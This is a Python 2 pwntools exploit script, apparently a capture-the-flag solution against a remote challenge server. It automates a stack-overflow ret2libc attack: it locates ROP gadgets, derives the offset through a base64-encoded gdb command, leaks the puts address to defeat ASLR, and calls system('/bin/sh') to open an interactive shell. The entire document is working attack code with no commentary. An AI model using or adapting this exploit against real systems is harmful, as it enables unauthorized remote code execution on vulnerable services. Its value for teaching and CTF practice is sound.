from pwn import *
import os
import base64

cnx = remote("challs.xmas.htsp.ro",12002)
cnx.recvuntil("Content: b'")
data = cnx.recvuntil("\n")
f = open("p","w")
f.write(base64.b64decode(data))
f.close()
pop_rdi = os.popen('ROPgadget --binary ./p|grep "pop rdi ; ret"|cut -d":" -f 1').read()
pop_rsi = os.popen('ROPgadget --binary ./p|grep "pop rsi ; pop r15 ; ret"|cut -d":" -f1').read()
print "aaaaaa",pop_rsi
pop_rsi = int(pop_rsi,16)
pop_rdi = int(pop_rdi,16)
elf = ELF("./p")

puts_plt = os.popen('gdb -q -ex "p puts" -ex "quit" ./p |cut -d" " -f8').read().strip()
puts_plt = int(puts_plt,16)
puts_got = elf.got['puts']
main = os.popen('objdump -d p | grep "40064d" | cut -d"$" -f2|cut -d"," -f1').read()
main = int(main,16)
print "pop_rdi: ",hex(pop_rdi)
print "pop_rsi:" ,hex(pop_rsi)
print "puts_plt:",hex(puts_plt)
print "main :",hex(main)
cmd = base64.b64decode("Z2RiIC1leCAiciA8IDwoZWNobyAnQUFBJUFBc0FBQkFBJEFBbkFBQ0FBLUFBKEFBREFBO0FBKUFBRUFBYUFBMEFBRkFBYkFBMUFBR0FBY0FBMkFBSEFBZEFBM0FBSUFBZUFBNEFBSkFBZkFBNUFBS0FBZ0FBNkFBTEFBaEFBN0FBTUFBaUFBOEFBTkFBakFBOUFBT0FBa0FBUEFBbEFBUUFBbUFBUkFBb0FBU0FBcEFBVEFBcUFBVUFBckFBVkFBdEFBV0FBdUFBWEFBdkFBWUFBd0FBWkFBeEFBeUFBekElJUElc0ElQkElJEElbkElQ0ElLUElKEElREElO0ElKUElRUElYUElMEElRkElYkElMUElR0ElY0ElMkElSEElZEElM0ElSUElZUElNEElSkElZkElNUElS0ElZ0ElNkElTEElaEElN0ElTUElaUElOEElTkElakElOUElT0Ela0ElUEElbEElUUElbUElUkElb0ElU0ElcEElVEElcUElVUElckElVkEldEElV0EldUElWEEldkElWUEld0ElWkEleEEleScpIiAtZXggInBhdHRlcm4gc2VhcmNoIiAtZXggInF1aXQiIC4vcCB8Z3JlcCAiXFtSU1BcXSAtLT4gb2Zmc2V0IiB8IGN1dCAtZCIgIiAtZiA0")
offset = os.popen(cmd).read()
print "offset: ",offset
offset = int(offset)
payload = ""
payload += "A"*(offset-9)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

cnx.sendline(payload)
leak = cnx.recvline()
leak = cnx.recvline()
leak = cnx.recvline()
leak = cnx.recvline()
leak = cnx.recvline()
leak = cnx.recvline()
print leak
leak = leak.split("\n")
print leak
puts_offset=0x00000000000809c0
try:
	lk = leak[0]
	lk = u64(lk.ljust(8,"\x00"))
except:
	exit(0)
base = lk - puts_offset
system = base + 0x04f440
binsh = base + 0x1b3e9a
print "base: ",hex(base)
print " system: ",hex(system)
print "binsh: ",hex(binsh)
payload = ""
payload += "A"*(offset-9)
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
cnx.sendline(payload)
cnx.interactive()
